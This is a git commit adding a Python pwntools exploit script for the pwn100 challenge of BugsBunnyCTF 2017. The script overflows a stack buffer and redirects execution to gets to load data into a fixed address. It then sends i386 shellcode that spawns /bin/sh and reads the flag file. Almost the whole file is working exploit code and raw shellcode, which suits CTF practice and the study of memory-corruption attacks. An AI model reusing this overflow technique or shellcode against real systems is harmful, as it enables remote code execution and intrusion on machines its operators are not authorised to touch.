14738f570eecb45a727e24a7baad63726a648082
chamli mohamed <mohamed.chamli@esprit.tn>
2017-08-01 02:20:41 +0200

    Create pwn100.py

---
+++ BugsBunnyCTF_2017/pwn100.py
@@ -0,0 +1,25 @@
+#TnMch
+from pwn import *
+
+context(arch='i386',os='linux')
+
+local = False
+#local = False
+
+if local: p = process("./pwn100")
+else: p = remote("127.0.0.1", 5252)
+
+binary = ELF("./pwn100")
+payload = "A"*0x18 + "B"*0x4
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+shelladd = 0x804a020
+gets_plt = 0x80482f0
+
+payload = payload
+payload +=p32(gets_plt)
+payload +=p32(shelladd) 
+payload +=p32(shelladd)
+p.send(payload+'\n')
+p.send(shellcode+'\n')
+p.send("cat /home/pwn100/flag"+'\n')
+print p.recv()
